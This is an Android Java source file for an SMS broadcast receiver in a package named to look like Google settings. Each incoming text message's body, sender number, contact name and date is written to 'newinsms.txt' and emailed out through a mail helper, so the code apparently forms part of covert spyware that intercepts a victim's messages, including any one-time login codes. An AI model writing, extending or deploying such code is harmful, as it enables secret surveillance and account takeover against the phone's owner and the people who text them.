package com.setting.dl.google.googlesettings.recievers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;

import com.setting.dl.google.googlesettings.mail.gmail.Mail;
import com.setting.dl.google.googlesettings.phone.Contacts;
import com.setting.dl.google.googlesettings.u;

public class SmsReciever extends BroadcastReceiver {
	
	
	@Override
	public void onReceive(Context context, Intent intent) {
		
		if(intent == null) return;
		
		Bundle intentExtras = intent.getExtras();
		
		if (intentExtras == null) return;
		
		StringBuilder message   = new StringBuilder();
		SmsMessage[] msgs       = Telephony.Sms.Intents.getMessagesFromIntent(intent);
		
		for (SmsMessage incomingSms : msgs) {
			
			message.append(incomingSms.getMessageBody());
		}
		
		String number = msgs[0].getOriginatingAddress();
		String name = Contacts.getContactNameWithNumber(context, number);
		
		String value = String.format(
				"Yeni mesaj\n---------------------------\n%-10s : %s\n%-10s : %s\n%-10s : %s\n%-10s : %s\n************************\n",
				"Gönderen", name,
				"Numara", number,
				"Tarih", u.getDate(msgs[0].getTimestampMillis()),
				"Mesaj", message
		);
		
		u.saveValue(context, "newinsms.txt", value);
		Mail.send(context, "newinsms.txt");
		
		
	}
}
